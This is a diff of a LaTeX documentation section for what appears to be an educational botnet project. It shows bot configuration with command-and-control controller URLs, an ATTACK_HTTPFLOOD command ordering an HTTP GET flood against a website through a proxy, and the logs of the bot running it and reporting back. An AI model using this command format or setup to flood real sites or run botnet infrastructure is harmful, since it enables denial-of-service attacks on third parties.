@@ -1,45 +1,57 @@
 \section{Sample execution}
 \label{sec:sample-execution}
 
-We show here a sample execution to give the reader an idea about how everything works. We suggest the reader to refer to \cite{video-tutorial} to better undesrtand how configuration and commands could be conveniently generated.
+We show here a sample execution to give the reader an idea about how everything works.
+We suggest the reader to refer to \cite{video-tutorial} to better understand how configuration and commands could be conveniently generated.
 
-In thi example, the bot is run in default mode with the following configuration:
+First, the controller is started and attached to the default port 3000 with standard verbosity:
 
 \begin{verbatim}
-  cnfInfo: True
-  tgtInfo: True
-  sysInfo: True
-  netInfo: True
-  controllers:
-    - init: invalid/botinit.json
-      command: invalid/botcmd.json
-      log: invalid/botlog.json
-    - init: controller/botinit.json
-      command: controller/botcmd.json
-      log: controller/botlog.json
-  polling: 90-120:SECONDS
-  reconnections: 3
-  reconnectionWait: 2-5:SECONDS
-  proxy: none
-  userAgent: MyAwesomeBot
+  $[controller-dir] npm start
 \end{verbatim}
 
-Notice that the first specified controller is an invalid one - it mimics an unrecheable or compromised contoller.
-The controller gives the bot the following \texttt{ATTACK-HTTP} command:
+Then, the following configuration is given for the bot, writing it in \texttt{/path/to/configuration/config.yaml}:
+
+\begin{verbatim}
+  cnfInfo: true
+  tgtInfo: true
+  sysInfo: true
+  netInfo: true
+  polling: "3-5:SECONDS"
+  reconnections: 3
+  reconnectionWait: "2-5:SECONDS"
+  proxy: "none"
+  sleep: "* * * ? * SAT,SUN"
+  authentication:
+    User-Agent: MyAwesomeBot
+  controllers:
+    - init: http://localhost:4000/init
+      command: http://localhost:4000/command
+      log: http://localhost:4000/report
+    - init: http://localhost:3000/init
+      command: http://localhost:3000/command
+      log: http://localhost:3000/report
+    - init: data/samples/controllers/1/init.json
+      command: data/samples/controllers/1/command.json
+      log: data/samples/controllers/1/report.json
+\end{verbatim}
+
+Notice that the first specified controller is an invalid one, the second one is valid because the controller has been started at port 3000, and the last one is provided as a fallback controller for local testing.
+The controller gives the bot the following \texttt{ATTACK\_HTTPFLOOD} command to perform a HTTP GET Flooding attack:
 
 \begin{verbatim}
   {
-    "command": "ATTACK_HTTP",
+    "command": "ATTACK_HTTPFLOOD",
     "attacks": [
       {
         "method": "GET",
-        "target": "http://www.twitter.com"
+        "target": "http://www.gmarciani.com"
       },
       {
         "method": "GET",
-        "target": "http://www.google.com",
+        "target": "http://www.gmarciani.com",
         "proxy": "31.220.56.101:80",
-        "properties": {
+        "header": {
           "User-Agent": "MyAwesomeBot"
         },
         "executions": 3,
@@ -49,78 +61,78 @@ The controller gives the bot the following \texttt{ATTACK-HTTP} command:
   }
 \end{verbatim}
 
-followed by commands \texttt{REPORT} and \texttt{KILL}.
+followed by a command \texttt{REPORT} to send the bot report to the controller, and a command \texttt{KILL} shutdown the bot, respectively.
 The following is the console output\footnote{classes and methods name indicated in \ref{sec:logging} have been omitted for better page formatting.}:
 
 \begin{verbatim}
   18:03:59.537 [main] INFO Bot initialized with ID=20-68-9D-C3-76-EB-5261@debian
   18:03:59.540 [main] INFO Joining botnet...
   18:03:59.541 [main] INFO Loading bot configuration
-               from C&C at invalid/botinit.json...
-  18:03:59.549 [main] WARN Cannot connect to C&C at invalid/botinit.json,
+               from C&C at http://localhost:4000/init...
+  18:03:59.549 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
                waiting for reconnection...
   18:03:59.551 [main] INFO Waiting for polling 2 SECONDS...
   18:04:01.552 [main] INFO Loading bot configuration
-               from C&C at invalid/botinit.json...
-  18:04:01.553 [main] WARN Cannot connect to C&C at invalid/botinit.json,
+               from C&C at http://localhost:4000/init...
+  18:04:01.553 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
                waiting for reconnection...
   18:04:01.554 [main] INFO Waiting for polling 3 SECONDS...
   18:04:04.555 [main] INFO Loading bot configuration
-               from C&C at invalid/botinit.json...
-  18:04:04.556 [main] WARN Cannot connect to C&C at invalid/botinit.json,
+               from C&C at http://localhost:4000/init...
+  18:04:04.556 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
                waiting for reconnection...
   18:04:04.557 [main] INFO Waiting for polling 2 SECONDS...
   18:04:06.557 [main] INFO Loading bot configuration
-               from C&C at invalid/botinit.json...
+               from C&C at http://localhost:4000/init...
   18:04:06.559 [main] WARN Maximum number of reconnections reached
-               for C&C at invalid/botinit.json
+               for C&C at http://localhost:4000/init
   18:04:06.559 [main] INFO Loading bot configuration
-               from C&C at controller/botinit.json...
+               from C&C at http://localhost:3000/init...
   18:04:06.668 [main] INFO Bot is up and running
-  18:04:06.755 [main] INFO Received command ATTACK_HTTP
+  18:04:06.755 [main] INFO Received command ATTACK_HTTPFLOOD
                with params {attacks=[
-               HttpAttack(method=GET, target=http://www.twitter.com,
-               proxy=null, properties={},
+               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+               proxy=null, header={},
                executions=1, period=null),
-               HttpAttack(method=GET, target=http://www.google.com,
-               proxy=31.220.56.101:80, properties={User-Agent=MyAwesomeBot},
+               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
                executions=3, period=10-15:SECONDS)]}
-               from C&C at controller/botcmd.json
-  18:04:06.756 [main] INFO Executing command ATTACK_HTTP
+               from C&C at http://localhost:3000/init
+  18:04:06.756 [main] INFO Executing command ATTACK_HTTPFLOOD
                with params {attacks=[
-               HttpAttack(method=GET, target=http://www.twitter.com,
-               proxy=null, properties={},
+               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+               proxy=null, header={},
                executions=1, period=null),
-               HttpAttack(method=GET, target=http://www.google.com,
-               proxy=31.220.56.101:80, properties={User-Agent=MyAwesomeBot},
+               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
                executions=3, period=10-15:SECONDS)]}
-               from C&C at controller/botcmd.json
-  18:04:06.756 [main] INFO Scheduling attack against http://www.twitter.com...
+               from C&C at http://localhost:3000/command
+  18:04:06.756 [main] INFO Scheduling attack against http://www.gmarciani.com...
   18:04:06.764 [main] INFO Attack scheduled
-  18:04:06.764 [main] INFO Scheduling attack against http://www.google.com...
+  18:04:06.764 [main] INFO Scheduling attack against http://www.gmarciani.com...
   18:04:06.776 [main] INFO Attack scheduled
   18:04:06.776 [main] INFO Waiting for polling 118 SECONDS...
   18:04:06.784 [BotPool_Worker-1] INFO Launching HTTP attack:
-               GET http://www.twitter.com (1/1)
+               GET http://www.gmarciani.com (1/1)
                behind proxy none
                with request params {User-Agent=MyAwesomeBot}
   18:04:06.784 [BotPool_Worker-2] INFO Launching HTTP attack:
-               GET http://www.google.com (1/3)
+               GET http://www.gmarciani.com (1/3)
                behind proxy 31.220.56.101:80
                with request params {User-Agent=MyAwesomeBot}
   18:04:20.766 [BotPool_Worker-3] INFO Launching HTTP attack:
-               GET http://www.google.com (2/3)
+               GET http://www.gmarciani.com (2/3)
                behind proxy 31.220.56.101:80
                with request params {User-Agent=MyAwesomeBot}
   18:04:34.766 [BotPool_Worker-4] INFO Launching HTTP attack:
-               GET http://www.google.com (3/3)
+               GET http://www.gmarciani.com (3/3)
                behind proxy 31.220.56.101:80
                with request params {User-Agent=MyAwesomeBot}
   18:06:04.780 [main] INFO Received command REPORT with params {}
-               from CC at controller/botcmd.json
+               from CC at http://localhost:3000/command
   18:06:04.780 [main] INFO Executing command REPORT with params {}
-  18:06:04.843 [main] INFO Sending report to C&C at controller/botlog.json...
-  18:06:04.846 [main] INFO Report sent to C&C at controller/botlog.json
+  18:06:04.843 [main] INFO Sending report to C&C at http://localhost:3000/report...
+  18:06:04.846 [main] INFO Report sent to C&C at http://localhost:3000/report
   {
     "config" : {
       "cnfInfo" : true,
@@ -134,9 +146,9 @@ The following is the console output\footnote{classes and methods name indicated 
       "userAgent" : "MyAwesomeBot",
       "sleep" : null,
       "controllers" : [ {
-        "init" : "controller/botinit.json",
-        "command" : "controller/botcmd.json",
-        "log" : "controller/botlog.json"
+        "init" : "http://localhost:3000/init",
+        "command" : "http://localhost:3000/command",
+        "log" : "http://localhost:3000/report"
       } ]
     },
     "attacks-http" : [ ],
@@ -145,7 +157,7 @@ The following is the console output\footnote{classes and methods name indicated 
   }
   18:06:04.847 [main] INFO Waiting for polling 91 SECONDS...
   18:07:35.851 [main] INFO Received command KILL with params {}
-               from C&C at controller/botcmd.json
+               from C&C at http://localhost:3000/command
   18:07:35.851 [main] INFO Executing command KILL with params {}
   18:07:35.853 [main] INFO Bot shut down
 \end{verbatim}
@@ -153,45 +165,45 @@ The following is the console output\footnote{classes and methods name indicated 
 The following are commands-related events (recorded in \texttt{data/log/commands.log}):
 
 \begin{verbatim}
-  18:04:06.755 Received command ATTACK_HTTP
+  18:04:06.755 Received command ATTACK_HTTPFLOOD
                with params {attacks=[
-               HttpAttack(method=GET, target=http://www.twitter.com,
-               proxy=null, properties={},
+               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+               proxy=null, header={},
                executions=1, period=null),
-               HttpAttack(method=GET, target=http://www.google.com,
-               proxy=31.220.56.101:80, properties={User-Agent=MyAwesomeBot},
+               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
                executions=3, period=10-15:SECONDS)]}
-               from C&C at controller/botcmd.json
+               from C&C at http://localhost:3000/command
   18:06:04.780 Received command REPORT
                with params {}
-               from C&C at controller/botcmd.json
+               from C&C at http://localhost:3000/command
   18:07:35.851 Received command KILL
                with params {}
-               from C&C at controller/botcmd.json
+               from C&C at http://localhost:3000/command
 \end{verbatim}
 
 The following are attacks-related events (recorded in \texttt{data/log/attacks.log}):
 
 \begin{verbatim}
-  18:04:06.784 Launching HTTP attack: GET http://www.twitter.com (1/1)
+  18:04:06.784 Launching HTTP attack: GET http://www.gmarciani.com (1/1)
                behind proxy none
-               with request params {User-Agent=MyAwesomeBot}
-  18:04:06.784 Launching HTTP attack: GET http://www.google.com (1/3)
+               with header {User-Agent=MyAwesomeBot}
+  18:04:06.784 Launching HTTP attack: GET http://www.gmarciani.com (1/3)
                behind proxy 31.220.56.101:80
-               with request params {User-Agent=MyAwesomeBot}
-  18:04:20.766 Launching HTTP attack: GET http://www.google.com (2/3)
+               with header {User-Agent=MyAwesomeBot}
+  18:04:20.766 Launching HTTP attack: GET http://www.gmarciani.com (2/3)
                behind proxy 31.220.56.101:80
-               with request params {User-Agent=MyAwesomeBot}
-  18:04:34.766 Launching HTTP attack: GET http://www.google.com (3/3)
+               with header {User-Agent=MyAwesomeBot}
+  18:04:34.766 Launching HTTP attack: GET http://www.gmarciani.com (3/3)
                behind proxy 31.220.56.101:80
-               with request params {User-Agent=MyAwesomeBot}
+               with header {User-Agent=MyAwesomeBot}
 
 \end{verbatim}
 
-The following are reports-related events (recorded in \texttt{data/log/reports.log}):
+The following are reports-related events, recorded in \texttt{data/log/reports.log}):
 
 \begin{verbatim}
-  18:06:04.846 Report sent to C&C at controller/botlog.json
+  18:06:04.846 Report sent to C&C at http://localhost:3000/report
   {
     "config" : {
       "cnfInfo" : true,
@@ -202,12 +214,14 @@ The following are reports-related events (recorded in \texttt{data/log/reports.l
       "reconnections" : 3,
       "reconnectionWait" : "2-5:SECONDS",
       "proxy" : "none",
-      "userAgent" : "MyAwesomeBot",
+      "authentication" : {
+        "User-Agent": "MyAwesomeBot"
+      },
       "sleep" : null,
       "controllers" : [ {
-        "init" : "controller/botinit.json",
-        "command" : "controller/botcmd.json",
-        "log" : "controller/botlog.json"
+        "init" : "http://localhost:3000/init",
+        "command" : "http://localhost:3000/command",
+        "log" : "http://localhost:3000/report"
       } ]
     },
     "attacks-http" : [ ],
@@ -215,3 +229,5 @@ The following are reports-related events (recorded in \texttt{data/log/reports.l
     "system-analysis" : "{os=A cool OS, kernel=A cool kernel}"
   }
 \end{verbatim}
+
+Notice that the same report has been stored in \texttt{controller/data/report/report.\$\{botIP\}.json}.
